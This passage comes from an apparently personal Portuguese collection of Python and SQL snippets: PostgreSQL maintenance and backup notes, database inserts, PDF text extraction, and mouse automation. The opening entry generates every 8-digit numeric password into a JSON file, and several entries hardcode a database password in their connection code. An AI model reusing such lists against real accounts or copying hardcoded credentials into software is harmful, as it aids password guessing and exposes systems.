+\ntodas_senhas_dig = ['a']\ndef salvar_json():\n\ttry:\n\t\twith open('asenhas_digitos.json', 'w') as file:\n\t\t\tjson.dump(todas_senhas_dig, file)\n\t\t\t\n\texcept FileNotFoundError:\n\t\tprint('Erro ao salvar as senhas')\n\ndef gerar_senhas():\n    caracteres =   string.digits  # todas as letras e d\u00edgitos\n    todas_combinacoes = itertools.product(caracteres, repeat=8)  # gera todas as combina\u00e7\u00f5es de 8 caracteres\n    senhas = [''.join(combinacao) for combinacao in todas_combinacoes]  # converte as combina\u00e7\u00f5es em uma lista de senhas\n    return senhas\n\n# Exemplo de uso\ntodas_senhas_dig = gerar_senhas()\nsalvar_json()\n", "categoria": "Programas exemplos"}, "projeto antifurto.": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QPushButton, QProgressBar)\nfrom PyQt6.QtCore import Qt, QThread, QTimer, pyqtSignal\nimport speech_recognition as sr\n\n\nclass WorkerThread(QThread):\n\tupdate_progress = pyqtSignal(str)\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\ttempo_de_escuta = 3600\n\t\n\tdef run(self):\n\t\trecognizer = sr.Recognizer()\n\t\twith sr.Microphone() as source:\n\t\t\tprint(\"Fale algo...\")\n\t\t\trecognizer.adjust_for_ambient_noise(source)  # Ajusta para o ru\u00eddo ambiente\n\t\t\taudio = recognizer.listen(source, timeout=6)\n\t\t\tprint(\"Tempo acabou.\")\n\t\ttry:\n\t\t\ttexto = recognizer.recognize_google(audio, language='pt-BR')  # Reconhece o \u00e1udio em portugu\u00eas brasileiro\n\t\t\treturn texto\n\t\texcept sr.UnknownValueError:\n\t\t\tprint(\"N\u00e3o foi poss\u00edvel entender o \u00e1udio.\")\n\t\texcept sr.RequestError as e:\n\t\t\tprint(\"Erro no servi\u00e7o de reconhecimento de voz; {0}\".format(e))\n\t\t\n\t\tself.update_progress.emit(str(texto))\n\n\t\t\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setFixedSize(500, 500)\n\t\tself.setWindowTitle('Projeto anti furto')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tself.btn_ouvir = QPushButton('Ouvir', self)\n\t\tself.btn_ouvir.setCheckable(True)\n\t\tself.btn_ouvir.clicked.connect(self.iniciar_calculo)\n\t\t\n\t\tself.btn_parar = QPushButton('Parar', self)\n\t\tself.btn_parar.move(20, 100)\n\t\tself.btn_parar.setCheckable(True)\n\n\t\t\n\tdef iniciar_calculo(self):\n\t\tself.worker_thread = WorkerThread()\n\t\tself.worker_thread.update_progress.connect(self.atualizar_barra)\n\t\tself.worker_thread.start()\n\t\t\n\n\t\n\tdef atualizar_barra(self, value):\n\t\tprint(str(value))\n\t\t\n\t\t\n\t\n\t\t\n\n\t\t\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\t\t\n", "categoria": "Programas exemplos"}, "Carregador dados excel python": {"codigo": "import openpyxl\nimport xlrd\nimport json\n\n# Substitua 'caminho/para/seu/arquivo' pelo caminho real para o seu arquivo\narquivo = 'estoque.xls'\n\n# Verifica a extens\u00e3o do arquivo\nextensao = arquivo.split('.')[-1]\n\n# Carrega o arquivo usando a biblioteca apropriada\nif extensao == 'xlsx':\n\tworkbook = openpyxl.load_workbook(arquivo)\n\tsheet = workbook.active\nelif extensao == 'xls':\n\tworkbook = xlrd.open_workbook(arquivo)\n\tsheet = workbook.sheet_by_index(0)\nelse:\n\tprint(\"Formato de arquivo n\u00e3o suportado.\")\n\n# Criando um dicion\u00e1rio para armazenar os produtos e quantidades\nestoque = {}\n\n# Iterando pelas linhas da planilha\nfor row_idx in range(1, sheet.nrows):\n\tinfo = {}\n\titem = sheet.cell_value(row_idx, 0)  # Substitua pelo \u00edndice da coluna correta\n\tcodigo = sheet.cell_value(row_idx, 1)  # Substitua pelo \u00edndice da coluna correta\n\tvalor = sheet.cell_value(row_idx, 2)  # Substitua pelo \u00edndice da coluna correta\n\tcusto = sheet.cell_value(row_idx, 3)  # Substitua pelo \u00edndice da coluna correta\n\tquantidade = sheet.cell_value(row_idx, 4)  # Substitua pelo \u00edndice da coluna correta\n\tfornecedor = sheet.cell_value(row_idx, 5)  # Substitua pelo \u00edndice da coluna correta\n\tcategoria = sheet.cell_value(row_idx, 6)  # Substitua pelo \u00edndice da coluna \n\tsubcategoria = sheet.cell_value(row_idx, 7)  # Substitua pelo \u00edndice da coluna correta\n\tmarca = sheet.cell_value(row_idx, 8)  # Substitua pelo \u00edndice da coluna correta\n\tlocalizacao = sheet.cell_value(row_idx, 9)  # Substitua pelo \u00edndice da coluna correta\n\tobservacoes = sheet.cell_value(row_idx, 10)  # Substitua pelo \u00edndice da coluna correta\n\t\n\tinfo['codigo'] = codigo\n\tinfo['valor'] = float(valor)\n\tinfo['custo'] = float(custo)\n\tinfo['quantidade'] = float(quantidade)\n\tinfo['fornecedor'] = fornecedor\n\tinfo['categoria'] = categoria\n\tinfo['subcategoria'] = subcategoria\n\tinfo['marca'] = marca\n\tinfo['localizacao'] = localizacao\n\tinfo['observacoes'] = observacoes\n\n\n\n\testoque[item] = info\n\n\nwith open('estoque.json', 'w') as file:\n\tjson.dump(estoque, file)\n", "categoria": "Programas exemplos"}, "mantendo o banco de dados": {"categoria": "SQL ", "codigo": "Tamanho da tabela em bytes\n\nSELECT pg_size_pretty(\n\tpg_total_relation_size('vacuum_test'));\n\nQuando atualizamos ou excluimos uma linha de uma tabela, o banco de dados cria uma nova linha com os dados atualizados e ordena novamente, por\u00e9m a linha anterior(linha morta), \u00e9 invis\u00edvel, por\u00e9m ela n\u00e3o \u00e9 exclu\u00edda, isso significa que com atualiza\u00e7\u00f5es o banco de dados cresce independentemente do acr\u00e9scimo de dados, para isso usamos o vacuum, ele diz que as linhas mortas podem ser utilizadas para serem substitu\u00eddas por informa\u00e7\u00f5es novas, ele n\u00e3o exclui linhas, ele apenas reutiliza.\n\nPara verificar qual tabela foi feito o procedimento.\n\nSELECT relname,\n\tlast_vacuum,\n\tlast_autovacuum,\n\tvacuum_count,\n\tautovacuum_count\nFROM pg_stat_all_tables;\n\n###############################################################\nVACUUM \u00e9 menos eficiente que FULL VACUUM, por\u00e9m o FULL VACUUM exige que a tebela esteja fora de utiliza\u00e7\u00e3o, pois exclui espa\u00e7os vazios, reindexa a etc\n\nVACUUM vacuum_test;\n\nFULL VACUUM vacuum_test;\n\n################################################################\nMudando configura\u00e7\u00f5es do servidor\n\nSHOW config_file;\n"}, "backup servidor ou de tabelas": {"categoria": "SQL ", "codigo": "Faz o backup do servidor analysis, com os gatilhos e tudo mais, esse comando \u00e9 dado no prompt sem precisar entrar no servidor, depois \u00e9 pedido a senha e pronto.o Fc significa que \u00e9 em formato compactado, o > simboliza para onde tudo vai, ou seja, para qual arquivo.\n\n\npg_dump -d analysis -U postgres -Fc > analysis_bachup.sql\n\n\n####################################################################\n\nCaso queira fazer o Backup apenas de uma tabela do banco de dados\npg_dump -t 'grades' -d analysis -U user_name -Fc > grades.sql \n\n\nRecuperando o BackUp\npg_restore -C -d postgres -U user_name analysis_backup.sql "}, "criando diretorios(pastas) e arquivos json automaticamente com script": {"codigo": "'''\nPrimeiro informamos o nome do diret\u00f3rio, depois se n\u00e3o existir \num diret\u00f3rio com esse nome, ser\u00e1 feita uma pasta com esse nome no\nlocal que o arquivo python est\u00e1, depois especificamos o caminho, que vai ser\no diretorio + o nome do arquivo, em seguida, tudo normal, salvamos uma lista \nou dicion\u00e1rio no arquivo json\n'''\n\n\nimport os\nimport json\n\n\ndiretorio = 'base_dados'\n\nif not os.path.exists(diretorio):\n\tos.makedir(diretorio)\n\t\t\nnome_arquivo = 'dados.json'\ncaminho_arquivo = os.path.join(diretorio, nome_arquivo)\n\nlista = [1, 2, 3, 4, 5]\n\nwith open(caminho_arquivo, 'w') as arquivo_json:\n\tjson.dump(lista, arquivo_json)\n\t\t\n\t\n\t\n\n", "categoria": "Python Geral"}, "processamento_fracionado, gerador de dados exemplo": {"categoria": "Programas exemplos", "codigo": "import json\nimport gc\nimport os\n\ndados_list = []\nnumero_pacote = 1\n\ndiretorio = 'base_dados'\nif not os.path.exists(diretorio):\n\tos.makedir(diretorio)\n\n\n\nfor numero in range(10000000):\n\tocupacao = len(dados_list)\n\tif ocupacao <= 1000000:\n\t\tdados_list.append(numero)\n\tif ocupacao == 1000000:\n\t\tnome_arquivo = f'pacote{numero_pacote}.json'\n\t\tcaminho_arquivo = os.path.join(diretorio, nome_arquivo)\n\t\twith open(caminho_arquivo, 'w') as arquivo_json:\n\t\t\tjson.dump(dados_list, arquivo_json)\n\t\tnumero_pacote += 1\n\t\tdados_list = []\n\t\tprint(f'Pacote{numero_pacote} criado com sucesso')\n\n\n\n\n\n\n\n\n\n\n\nimport json\nimport gc\nimport os\n\nfor pacote in range(1, 10):\n\tdados_list = []\n\twith open(f'base_dados/pacote{pacote}.json', 'r') as file:\n\t\tcontent = file.read()\n\t\tif content:\n\t\t\tdados_list = json.loads(content)\n\tprint(sum(dados_list))"}, "monitoramento de memoria ram": {"categoria": "Python Geral", "codigo": "'''\nMonitora a memoria RAM gasta para fazer o processo atual, ou seja\nn\u00e3o geral\n\n'''\n\n\nimport psutil\ndef memoria_usada():\n\tprocesso = psutil.Process()\n\tmemoria_info = processo.memory_info()\n\tmemoria_usada_mb = memoria_info.rss/(1024**3)\n\treturn memoria_usada_mb\n\t\nwhile True:\n\tprint(str(memoria_usada()))\n\n\n####################################################################\n\n'''\nMostra quanto de mem\u00f3ria tem no sistema\n\n'''\n\n\nimport psutil\ndef memoria_total():\n\tmemoria_usada_gb = psutil.virtual_memory().total/(1024**3)\n\treturn memoria_total_gb\n\t\nwhile True:\n\tprint(str(memoria_total()))\n\n\n####################################################################\n\n\n'''\nMostra a quantidade de mem\u00f3ria que est\u00e1 sendo usada\n\n'''\n\n\nimport psutil\ndef memoria_total():\n\tmemoria = psutil.virtual_memory()\n\tmemoria_usada_gb = memoria.used/(1024**3)\n\treturn memoria_usada_gb\n\t\nwhile True:\n\tprint(str(memoria_total()))\n\t\t\n\t\t\n"}, "Teclado teclas trocadas": {"categoria": "Funcionalidades", "codigo": "Baixe o AutoHotKey, abra um bloco de notas e digite como exemplo o scrip abaixo\n^a::Send, t    ou seja quando apertar Ctrl + a = t, salve esse arquivo no formato .ahk, \npressione Win + r e digite shell:startup e mova o script para esta pasta, dessa forma toda vez que o computador iniciar inicia-se o script.\n\n\n\n\n+ : Shift\n! : Alt\n^ : Ctrl\n# : Win (tecla Windows)\n\n\n"}, "python + postgres conexao ": {"codigo": "'''\ncursor.execute() \u00e9 o comando na linguagem de banco de dados\nconn.commit() \u00e9 o que vai confirmar as ordens e tornalas permantente, no caso a ordens\nde modifica\u00e7\u00f5es\n\n'''\t\n\n\tdef confirmar_estoque(self):\n\t\t'''Conectando ao servidor'''\n\t\tprint('Conectando ao servidor')\n\t\tconn = psycopg2.connect(\n\t\t\tdbname = 'analysis',\n\t\t\tuser = 'postgres',\n\t\t\tpassword = '520250890',\n\t\t\thost = 'localhost',\n\t\t\tport = '5432'\n\t\t\t)\n\t\tprint('Servidor conectado')\n\t\tcursor = conn.cursor()\n\t\tcursor.execute('''\n\t\tCREATE TABLE estoque(\n\t\t\tid bigserial PRIMARY KEY,\n\t\t\tcodigo int,\n\t\t\tproduto varchar(50) NOT NULL,\n\t\t\tpreco numeric(9,3) NOT NULL, \n\t\t\tcusto numeric(9,3) NOT NULL,\n\t\t\tquantidade numeric(9,3) NOT NULL,\n\t\t\tcategoria varchar(30) NOT NULL,\n\t\t\tsubcategoria varchar(30) NOT NULL,\n\t\t\tmarca varchar(30) NOT NULL,\n\t\t\tfornecedor varchar(50) NOT NULL);\n\t\t''')\n\t\tprint('Tabela de estoque criada no servidor')\n\t\t\n\t\tconn.commit()", "categoria": "python + sql"}, "inserindo dados python + postgres": {"categoria": "python + sql", "codigo": "'''\nPara inserir os dados no banco de dados, devemos uas o %s e passar uma tupla em seguida\nseparada por uma virgula, com as vari\u00e1veis carregando seus valores j\u00e1 formatados.\n'''\n\n\tdef confirmar_estoque(self):\n\t\t'''dados do produto cadastrado'''\n\t\tcodigo = int(self.codigo_edit.text())\n\t\tproduto = str(self.produto_edit.text())\n\t\tpreco = float(self.preco_edit.text())\n\t\tcusto = float(self.custo_edit.text())\n\t\tquantidade = float(self.quantidade_edit.text())\n\t\tcategoria = str(self.categoria_edit.text())\n\t\tsubcategoria = str(self.sub_categoria_edit.text())\n\t\tmarca = str(self.marca_edit.text())\n\t\tfornecedor = str(self.fornecedor_edit.text())\n\t\n\n\t\t'''Conectando ao servidor'''\n\t\tprint('Conectando ao servidor')\n\t\tconn = psycopg2.connect(\n\t\t\tdbname = 'analysis',\n\t\t\tuser = 'postgres',\n\t\t\tpassword = '520250890',\n\t\t\thost = 'localhost',\n\t\t\tport = '5432'\n\t\t\t)\n\t\tprint('Servidor conectado')\n\t\tcursor = conn.cursor()\n\t\tcursor.execute(f'''\n\t\tINSERT INTO estoque(codigo, produto, preco, custo, \n\t\tquantidade, categoria,subcategoria, marca, fornecedor)\n\t\tVALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s)\n\t\t''', (codigo,produto,preco,custo,quantidade,\n\t\t\tcategoria,subcategoria,marca,fornecedor)\n\t\t)\n\n\t\t#lista_tuplas = cursor.fetchall()\n\t\t\n\t\t\n\t\tconn.commit()\n\t\tprint('Produto inserido na tabela estoque')\n\n\nSQLITE3\n######################################################################\n\nimport sqlite3\n'''Conecanto com o banco de dados\n\tse o banco de dados n\u00e3o existir \n\tser\u00e1 criado automaticamente'''\nconn = sqlite3.connect('arc.db')\ncursor = conn.cursor()\n\n'''\ndeve usar o commit() para confirmar as modifica\u00e7\u00f5es, \u00e9 usado quando\nvai modificar o banco de dados, no postgres a ? = %s (s, a)\n'''\ns = '1234'\na = '4321'\ncursor.execute('''\n\tINSERT INTO senhas_digitos(senhas)\n\tVALUES(?, ?);\n\t\t\t\t''',(s, a,))\nconn.commit()\n\n\n\n\n'''\nPARA INSERIR MUITAS LINHAS EM MASSA\n'''\ncursor.executemany('''\n\tINSERT INTO senhas_digitos(senhas)\n\tVALUES(?);\n\t\t\t\t''', ((str(s),) for s in senhas))\n\n\n\n\ncursor.execute('''\n\tSELECT * FROM senhas_digitos;\n\n\t\t\t\t'''\nlista_tuplas = cursor.fetchall()\n\n'''\nPARA FECHAR O BANCO DE DADOS AO TERMINAR DE ACESSAR OS DADOS\n'''\nconn.close()\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n####################################################################\nimport sys, psycopg2\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLineEdit, QLabel, QPushButton,\nQGridLayout)\n\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\tself.setWindowTitle('Estoque')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\n\tdef setUpMainWindow(self):\t\n\t\t'''Labels da p\u00e1gina de entrada de estoque'''\n\t\t\n\t\t\n\t\tcodigo_label = QLabel('Codigo:')\n\t\tproduto_label = QLabel('Produto:')\n\t\tpreco_label = QLabel('Pre\u00e7o:')\n\t\tcusto_label = QLabel('Custo:')\n\t\tquantidade_label = QLabel('Quantidade:')\n\t\tcategoria_label = QLabel('Categoria:')\n\t\tsub_categoria_label = QLabel('SubCategoria:')\n\t\tmarca_label = QLabel('Marca:')\n\t\tfornecedor = QLabel('Fornecedor:')\n\t\t\n\t\t\n\t\t'''LineEdits da p\u00e1gina de entrada de estoque'''\n\t\tself.codigo_edit = QLineEdit('1')\n\t\tself.produto_edit = QLineEdit('parafuso 6 20 ri ma 8.8')\n\t\tself.preco_edit = QLineEdit('1')\n\t\tself.custo_edit = QLineEdit('0.5')\n\t\tself.quantidade_edit = QLineEdit('1000')\n\t\tself.categoria_edit = QLineEdit('parafuso')\n\t\tself.sub_categoria_edit = QLineEdit('6mm')\n\t\tself.marca_edit = QLineEdit('mmm')\n\t\tself.fornecedor_edit = QLineEdit('metalbo')\n\t\t\n\t\t'''Botoes'''\n\t\tself.botao_confirmar_estoque = QPushButton('Confirmar')\n\t\tself.botao_confirmar_estoque.clicked.connect(self.confirmar_estoque)\n\t\t\n\t\tself.botao_retirar_dados = QPushButton('Retirar')\n\t\tself.botao_retirar_dados.clicked.connect(self.retirando_dados)\n\t\t\n\t\t\n\t\t'''Layout da p\u00e1gina de estoque'''\n\t\tself.main_grid = QGridLayout()\n\t\t'''labels'''\n\t\tself.main_grid.addWidget(codigo_label, 0, 0)\n\t\tself.main_grid.addWidget(produto_label, 1, 0)\n\t\tself.main_grid.addWidget(preco_label, 2, 0)\n\t\tself.main_grid.addWidget(custo_label, 3, 0)\n\t\tself.main_grid.addWidget(quantidade_label, 4,0)\n\t\tself.main_grid.addWidget(categoria_label, 5,0)\n\t\tself.main_grid.addWidget(sub_categoria_label, 6,0)\n\t\tself.main_grid.addWidget(marca_label, 7, 0)\n\t\tself.main_grid.addWidget(fornecedor, 8, 0)\n\t\t'''lineedits'''\n\t\tself.main_grid.addWidget(self.codigo_edit, 0, 1)\n\t\tself.main_grid.addWidget(self.produto_edit, 1, 1)\n\t\tself.main_grid.addWidget(self.preco_edit, 2, 1)\n\t\tself.main_grid.addWidget(self.custo_edit, 3, 1)\n\t\tself.main_grid.addWidget(self.quantidade_edit, 4, 1)\n\t\tself.main_grid.addWidget(self.categoria_edit, 5, 1)\n\t\tself.main_grid.addWidget(self.sub_categoria_edit, 6, 1)\n\t\tself.main_grid.addWidget(self.marca_edit, 7, 1)\n\t\tself.main_grid.addWidget(self.fornecedor_edit, 8, 1)\n\t\t'''Botoes'''\n\t\tself.main_grid.addWidget(self.botao_confirmar_estoque, 9, 1)\n\t\tself.main_grid.addWidget(self.botao_retirar_dados, 9,0)\n\t\t\n\t\t\n\n\t\tself.setLayout(self.main_grid)\n\t\t\n\tdef confirmar_estoque(self):\n\t\t'''dados do produto cadastrado'''\n\t\tcodigo = int(self.codigo_edit.text())\n\t\tproduto = str(self.produto_edit.text())\n\t\tpreco = float(self.preco_edit.text())\n\t\tcusto = float(self.custo_edit.text())\n\t\tquantidade = float(self.quantidade_edit.text())\n\t\tcategoria = str(self.categoria_edit.text())\n\t\tsubcategoria = str(self.sub_categoria_edit.text())\n\t\tmarca = str(self.marca_edit.text())\n\t\tfornecedor = str(self.fornecedor_edit.text())\n\t\n\n\t\t'''Conectando ao servidor'''\n\t\tprint('Conectando ao servidor')\n\t\tconn = psycopg2.connect(\n\t\t\tdbname = 'analysis',\n\t\t\tuser = 'postgres',\n\t\t\tpassword = '520250890',\n\t\t\thost = 'localhost',\n\t\t\tport = '5432'\n\t\t\t)\n\t\tprint('Servidor conectado')\n\t\tcursor = conn.cursor()\n\t\tcursor.execute(f'''\n\t\tINSERT INTO estoque(codigo, produto, preco, custo, \n\t\tquantidade, categoria,subcategoria, marca, fornecedor)\n\t\tVALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s)\n\t\t''', (codigo,produto,preco,custo,quantidade,\n\t\t\tcategoria,subcategoria,marca,fornecedor)\n\t\t)\n\t\t\n\t\t\n\t\tconn.commit()\n\t\tprint('Produto inserido na tabela estoque')\n\t\t\n\tdef retirando_dados(self):\n\t\tprint('Conectando ao servidor')\n\t\tconn = psycopg2.connect(\n\t\t\tdbname = 'analysis',\n\t\t\tuser = 'postgres',\n\t\t\tpassword = '520250890',\n\t\t\thost = 'localhost',\n\t\t\tport = '5432'\n\t\t\t)\n\t\tprint('Servidor conectado')\n\t\t\n\t\tcursor = conn.cursor()\n\t\tcursor.execute('''\n\t\tSELECT * FROM estoque;\n\t\t''')\n\t\t\n\t\testoque = cursor.fetchall()\n\t\t#print(estoque)\n\t\tfor e in estoque:\n\t\t\tprint(f'Id: {e[0]}')\n\t\t\tprint(f'Codigo: {e[1]}')\n\t\t\tprint(f'Produto: {e[2]}')\n\t\t\tprint(f'Pre\u00e7o: {e[3]}')\n\t\t\tprint(f'Custo: {e[4]}')\n\t\t\tprint(f'Quantidade: {e[5]}')\n\t\t\tprint(f'Categoria: {e[6]}')\n\t\t\tprint(f'SubTotal: {e[7]}')\n\t\t\tprint(f'Marca: {e[8]}')\n\t\t\tprint(f'Fornecedor: {e[9]}\\n')\n\t\t\n\t\t\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\t\n\t\n"}, "update postgres": {"codigo": "# Atualizar o pre\u00e7o de um produto com base no seu ID usando um dicion\u00e1rio\nid_produto = 1\nnovo_preco = 20.99\ncursor.execute('UPDATE produtos SET preco = %(preco)s WHERE id = %(id)s', {'preco': novo_preco, 'id': id_produto})\n", "categoria": "python + sql"}, "PDF = lista[]": {"categoria": "python texto", "codigo": "import PyPDF2\n\n# Abre o arquivo PDF\nwith open('A Bola de Neve.pdf', 'rb') as file:\n\t# Cria um objeto PDF Reader\n\treader = PyPDF2.PdfReader(file)\n    \n\t# Inicializa uma lista para armazenar o texto de cada p\u00e1gina\n\ttexto_lista = []\n    \n\t# Define o intervalo de p\u00e1ginas (note que a indexa\u00e7\u00e3o come\u00e7a em 0)\n\t#inicio_pagina = 9  # P\u00e1gina 10 (indexa\u00e7\u00e3o come\u00e7a em 0)\n\t#fim_pagina = 19    # P\u00e1gina 20 (indexa\u00e7\u00e3o come\u00e7a em 0)\n\n\t# Itera pelo intervalo de p\u00e1ginas desejado\n\t#for page_num in range(inicio_pagina, fim_pagina + 1):\n\tfor page_num in range(len(reader.pages));\n\t\t# Obt\u00e9m o objeto da p\u00e1gina\n\t\tpage = reader.pages[page_num]\n        \n\t\t# Extrai o texto da p\u00e1gina\n\t\ttexto = page.extract_text()\n        \n\t\t# Adiciona o texto \u00e0 lista\n\t\ttexto_lista.append(texto)\n\t\tprint(f'P\u00e1gina {page_num + 1} lida e dispon\u00edvel em mem\u00f3ria!!', end='\\r')\n\n# Exibe o conte\u00fado extra\u00eddo\nfor i, texto in enumerate(texto_lista):\n\tprint(\"\")\n\tprint(texto)\n\tprint()\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nImporta\u00e7\u00e3o e an\u00e1lise\n###############################################################\nimport os\nimport PyPDF2\n\n# Define o caminho da pasta\ncaminho_pasta = 'C:/Users/pcleu/Desktop/pdf'\n\n# Lista para armazenar os nomes dos arquivos PDF\narquivos_pdf = []\n\n# Itera pelos arquivos na pasta\nfor arquivo in os.listdir(caminho_pasta):\n\t# Verifica se o arquivo termina com '.pdf'\n\tif arquivo.endswith('.pdf'):\n\t\tarquivos_pdf.append(arquivo)\n\n# Exibe a lista de arquivos PDF\nprint(arquivos_pdf)\ntexto_lista = []\nfor arquivo in arquivos_pdf:\n\t# Abre o arquivo PDF\n\twith open(arquivo, 'rb') as file:\n\t\t# Cria um objeto PDF Reader\n\t\treader = PyPDF2.PdfReader(file)\n\t\t\n\t\t# Inicializa uma lista para armazenar o texto de cada p\u00e1gina\n\t\t#texto_lista = []\n\t\t\n\t\t# Define o intervalo de p\u00e1ginas (note que a indexa\u00e7\u00e3o come\u00e7a em 0)\n\t\t#inicio_pagina = 9  # P\u00e1gina 10 (indexa\u00e7\u00e3o come\u00e7a em 0)\n\t\t#fim_pagina = 19    # P\u00e1gina 20 (indexa\u00e7\u00e3o come\u00e7a em 0)\n\n\t\t# Itera pelo intervalo de p\u00e1ginas desejado\n\t\t#for page_num in range(inicio_pagina, fim_pagina + 1):\n\t\tfor page_num in range(len(reader.pages)):\n\t\t\t# Obt\u00e9m o objeto da p\u00e1gina\n\t\t\tpage = reader.pages[page_num]\n\t\t\t\n\t\t\t# Extrai o texto da p\u00e1gina\n\t\t\ttexto = page.extract_text()\n\t\t\t\n\t\t\t# Adiciona o texto \u00e0 lista\n\t\t\ttexto_lista.append(texto)\n\t\t\tprint(f'P\u00e1gina {page_num + 1} lida e dispon\u00edvel em mem\u00f3ria!!', end='\\r')\n\n\t# Exibe o conte\u00fado extra\u00eddo\n\tfor i, texto in enumerate(texto_lista):\n\t\tprint(f\"P\u00e1gina {arquivo} lido com sucesso e em mem\u00f3ria\")\n\t\t#print(texto)\n\t\tprint()\n\n"}, "replace - troca charactere por outro em um texto": {"codigo": "frase = 'ol\u00e1, tudo beleza?'\nfrase_nova = frase.replace('\u00e1', 'a').replace(',', '~')\nprint(frase_nova)\n", "categoria": "python texto"}, "split() - separando palavras de uma frase": {"codigo": "frase = 'ol\u00e1, tudo beleza?'\npalavras = frase.split(' ')  # Divide a frase usando espa\u00e7o como delimitador\nprint(palavras)", "categoria": "python texto"}, "re limpar texto": {"categoria": "python texto", "codigo": "import re\n\ntexto = '''texto_completo'''\n\n# Define um padr\u00e3o de express\u00e3o regular para os caracteres que voc\u00ea deseja remover\npattern = r'[\\s\\t\\-_\\,\\:\\;\\\\'\\\"]+'\n\n# Substitui todos os caracteres correspondentes ao padr\u00e3o por uma string vazia\ntexto_limpo = re.sub(pattern, '', texto)\n\nprint(texto_limpo)\n\n\n\no ^ dentro dos colchetes \u00e9 nega\u00e7\u00e3o\ndef apenas_numeros_parenteses(texto):\n\t# Express\u00e3o regular para manter apenas n\u00fameros e par\u00eanteses\n\tpadrao = r'[^0-9\\(\\)\\\" \"]'\n\t# Substitui qualquer coisa que n\u00e3o seja n\u00fameros ou par\u00eanteses por uma string vazia\n\tresultado = re.sub(padrao, '', texto)\n\treturn resultado\n"}, ".startswith('asaaa') - verifica que sa string come\u00e7a com .....": {"codigo": "frase = 'ol\u00e1, tudo beleza?'\nif frase.startswith('ol\u00e1'):\n\tprint('okay')", "categoria": "python texto"}, "t\u00edtulos de arquivos em uma pasta coletados automaticamente": {"codigo": "import os\n\n# Define o caminho da pasta\ncaminho_pasta = 'C:/Users/pcleu/Desktop/pdf'\n\n# Lista para armazenar os nomes dos arquivos PDF\narquivos_pdf = []\n\n# Itera pelos arquivos na pasta\nfor arquivo in os.listdir(caminho_pasta):\n\t# Verifica se o arquivo termina com '.pdf'\n\tif arquivo.endswith('.pdf'):\n\t\tarquivos_pdf.append(arquivo)\n\n# Exibe a lista de arquivos PDF\nprint(arquivos_pdf)", "categoria": "python texto"}, "enumerate() ": {"codigo": "lista = ['parafuso', 'abobora', 'moto']\n\nfor index, paralavra in enumerate(lista):\n\tprint(f'{index}. {paralavra}')", "categoria": "Python Geral"}, "pyautogui - capturar coordenada do mouse tempo real python": {"codigo": "import pyautogui\nlista = []\nwhile True:\n\tx, y = pyautogui.position()\n\t#print (\"Posicao atual do mouse:\")\n\tprint (f'x = {str(float(x))} y = {str(float(y))}', end='\\r')\n\n\t#retorna True se x & y estiverem dentro da tela\n\t#print (\"\\nEsta dentro da tela?\")\n\t#resp = pyautogui.onScreen(x, y)\n\t#print (str(resp))\n", "categoria": "mouse teclado"}, "pynput - capturar coordenada mouse quando clicado": {"codigo": "from pynput import mouse\n\ndef on_click(x, y, button, pressed):\n\tif pressed:\n\t\tprint(f'{x} {y}')\n\nwith mouse.Listener(on_click=on_click) as listener:\n\tlistener.join()", "categoria": "mouse teclado"}, "pynput - controlar o mouse e clicar": {"codigo": "from pynput.mouse import Button, Controller\nimport time\n\n# Lista de coordenadas (x, y)\ncoordenadas = [(100, 200), (150, 250), (200, 300)]\n\n# Cria o controlador do mouse\nmouse = Controller()\n\ndef mover_e_clicar(coordenadas):\n\tfor (x, y) in coordenadas:\n\t\t# Move o mouse para a coordenada (x, y)\n\t\tmouse.position = (x, y)\n\t\t# Aguarda um pouco para garantir que o movimento foi completado\n\t\ttime.sleep(0.5)\n\t\t# Simula o clique do mouse\n\t\tmouse.click(Button.left, 1)\n\t\t# Aguarda um pouco entre os cliques\n\t\ttime.sleep(0.5)\n\n# Chama a fun\u00e7\u00e3o para mover o mouse e clicar\nmover_e_clicar(coordenadas)", "categoria": "mouse teclado"}, "procurar o ponto vermelho e clicar": {"codigo": "import cv2\nimport numpy as np\nfrom PIL import ImageGrab\nfrom pynput.mouse import Button, Controller\nimport time\n\ndef capturar_tela():\n    # Captura a tela toda\n    screenshot = ImageGrab.grab()\n    # Converte a imagem para um formato que o OpenCV pode usar\n    img_np = np.array(screenshot)\n    # Converte de BGR para RGB\n    frame = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB)\n    return frame\n\ndef encontrar_ponto_vermelho(frame):\n    # Converte a imagem para o espa\u00e7o de cores HSV\n    hsv = cv2.cvtColor(frame, cv2.COLOR_RGB2HSV)\n    \n    # Define o intervalo para a cor vermelha\n    lower_red = np.array([0, 100, 100])\n    upper_red = np.array([10, 255, 255])\n    \n    # Cria uma m\u00e1scara para as \u00e1reas vermelhas\n    mask = cv2.inRange(hsv, lower_red, upper_red)\n    \n    # Encontra os contornos na m\u00e1scara\n    contours, _ = cv2.findContours(mask, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)\n    \n    # Encontra o maior contorno\n    if contours:\n        largest_contour = max(contours, key=cv2.contourArea)\n        M = cv2.moments(largest_contour)\n        if M[\"m00\"] != 0:\n            cx = int(M[\"m10\"] / M[\"m00\"])\n            cy = int(M[\"m01\"] / M[\"m00\"])\n            return cx, cy\n    \n    return None\n\ndef mover_e_clicar(x, y):\n    mouse = Controller()\n    mouse.position = (x, y)\n    time.sleep(0.5)\n    mouse.click(Button.left, 1)\n\n# Captura a tela\nframe = capturar_tela()\n\n# Encontra o ponto vermelho\nponto_vermelho = 